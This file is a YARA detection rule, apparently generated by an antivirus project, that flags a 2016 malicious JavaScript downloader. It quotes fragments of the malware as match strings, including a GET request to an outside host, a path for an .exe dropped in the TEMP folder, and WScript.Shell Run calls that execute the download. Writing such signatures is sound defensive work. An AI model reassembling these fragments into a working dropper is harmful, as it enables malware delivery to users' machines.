rule sig_20160329_1c2c0d1364bb0e95ffd60c4bc70c4cf5 {
  meta:
    description = "datamaliciousorder - file 20160329_1c2c0d1364bb0e95ffd60c4bc70c4cf5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5323e467f2a539e66159ebf8cc34353d2c261d2e8caee1aa52e30ac5e181bfdd"

  strings:
    $s1  = "tL[U](\"GET\", \"http://digimacro.com.br/m8isda\", false);" fullword ascii
    $s2  = "function W() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"LD72c6rwS0yji.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Cx](Z() * 11); if (tL[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function A(RP, G){aK = aK * 1; return RP - G;};" fullword ascii
    $s5  = "var L = function H() {return WScript[cN](\"WScript.Shell\");}(), e0 = 11;" fullword ascii
    $s6  = "function p(){return \"\" + k;};" fullword ascii
    $s7  = "function iq() {return ((qS == true) && (qS == Ta)) ? 1 : aK;};" fullword ascii
    $s8  = "function fF(Bz){L[\"Run\"](Bz, aK, aK);};" fullword ascii
    $s9  = "function ls(){return cN;};" fullword ascii
    $s10 = "function Z(){return 22;};" fullword ascii
    $s11 = "function DF()" fullword ascii
    $s12 = "return A(e, Y);" fullword ascii
    $s13 = "var s = new this[\"Date\"]();" fullword ascii
    $s14 = " while (I){" fullword ascii
    $s15 = "function V(K) {var j = (1, 2, 3, 4, 5, K); return j;};" fullword ascii
    $s16 = "var Ta = false;" fullword ascii
    $s17 = "var Z0 = false;" fullword ascii
    $s18 = "var qS = false;" fullword ascii
    $s19 = "qS = true; " fullword ascii
    $s20 = "Ta = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}